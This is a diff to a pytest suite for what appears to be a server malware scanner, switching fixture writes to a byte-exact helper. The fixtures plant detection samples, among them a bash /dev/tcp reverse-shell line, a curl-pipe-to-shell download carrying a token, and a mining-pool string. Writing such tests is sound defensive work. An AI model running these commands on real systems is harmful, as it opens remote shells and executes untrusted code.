@@ -24,6 +24,11 @@ CLEAN_PHP = "<?php echo htmlspecialchars($_GET['q'] ?? ''); ?>\n"
 CLEAN_JS = "const r = await fetch('/api'); console.log(JSON.stringify(r));\n"
 
 
+def put(path, text):
+    """Write with \n line endings on every OS, so hashes in the tests match the bytes on disk."""
+    path.write_bytes(text.encode("utf-8"))
+
+
 @pytest.fixture
 def server(tmp_path, monkeypatch):
     """A game host with a few servers: some clean files, some planted ones."""
@@ -33,21 +38,21 @@ def server(tmp_path, monkeypatch):
     vol = tmp_path / "volumes"
     a = vol / "a1" / "plugins" / "web" / "upload"
     a.mkdir(parents=True)
-    (a / "img.php").write_text(WEBSHELL)
-    (a / "index.php").write_text(CLEAN_PHP)
+    put(a / "img.php", WEBSHELL)
+    put(a / "index.php", CLEAN_PHP)
     b = vol / "b2"
     (b / "tmp").mkdir(parents=True)
-    (b / "tmp" / "start.sh").write_text(MINER)                 # tmp/ is not skipped
-    (b / "config.yml").write_text("motd: hi\n" + HARBOR)       # nor is config.yml
-    (b / "bot.js").write_text(CLEAN_JS)
+    put(b / "tmp" / "start.sh", MINER)                 # tmp/ is not skipped
+    put(b / "config.yml", "motd: hi\n" + HARBOR)       # nor is config.yml
+    put(b / "bot.js", CLEAN_JS)
     (b / "node_modules" / "x").mkdir(parents=True)
-    (b / "node_modules" / "x" / "evil.js").write_text(WEBSHELL)  # package caches are skipped
-    (b / "app.min.js").write_text(WEBSHELL)                    # and so are minified bundles
+    put(b / "node_modules" / "x" / "evil.js", WEBSHELL)  # package caches are skipped
+    put(b / "app.min.js", WEBSHELL)                    # and so are minified bundles
     c = vol / "c3"
     c.mkdir()
-    (c / "run").write_text(REVSHELL)                           # extensionless script with a shebang
-    (c / "notes").write_text("bash -i >& /dev/" + "tcp/1.2.3.4/1 0>&1\n")  # no shebang: not read
-    (c / "decoder.php").write_text(ENCODED)
+    put(c / "run", REVSHELL)                           # extensionless script with a shebang
+    put(c / "notes", "bash -i >& /dev/" + "tcp/1.2.3.4/1 0>&1\n")  # no shebang: not read
+    put(c / "decoder.php", ENCODED)
     with zipfile.ZipFile(c / "plugin.jar", "w") as z:
         z.writestr("plugin.yml", "name: Fine\n")
         z.writestr("a/B.class", b"\xca\xfe\xba\xbe\x00\x01stratum" + b"+tcp://pool.example:1\x00")
@@ -95,7 +100,7 @@ def test_snippets_hide_homes_and_secrets(tmp_path, monkeypatch):
     monkeypatch.setattr(procscan, "_homes", lambda: [str(home)])
     site = home / "site"
     site.mkdir(parents=True)
-    (site / "x.sh").write_text(f"curl -H 'token=abc123' https://get.example/i.sh | sh  # {home}/x\n")
+    put(site / "x.sh", f"curl -H 'token=abc123' https://get.example/i.sh | sh  # {home}/x\n")
     r = threatscan.scan([str(site)])
     f = r["findings"][0]
     assert f["path"].startswith("~") and str(home) not in f["snippet"]
@@ -137,7 +142,7 @@ def test_each_finding_is_raised_once(server):
     assert "real_path" not in json.dumps(first)
     again = w.scan("test")
     assert again["new_alerts"] == 0 and len(core.ingested) == first["new_alerts"]
-    (server / "c3" / "run").write_text(REVSHELL + "# changed\n")  # new contents: a new finding
+    put(server / "c3" / "run", REVSHELL + "# changed\n")  # new contents: a new finding
     assert w.scan("test")["new_alerts"] == 1
     assert core.scribe.records[-1][0] == "threat_scan"
 
@@ -165,7 +170,7 @@ def test_quarantine_refuses_a_changed_file(server):
     w = ThreatWatch(FakeCore([str(server)]))
     r = w.scan("test")
     f = next(f for f in r["findings"] if f["path"].endswith("start.sh"))
-    (server / "b2" / "tmp" / "start.sh").write_text("echo fine\n")
+    put(server / "b2" / "tmp" / "start.sh", "echo fine\n")
     with pytest.raises(ValueError, match="changed"):
         w.quarantine(f["id"], "erick")
 
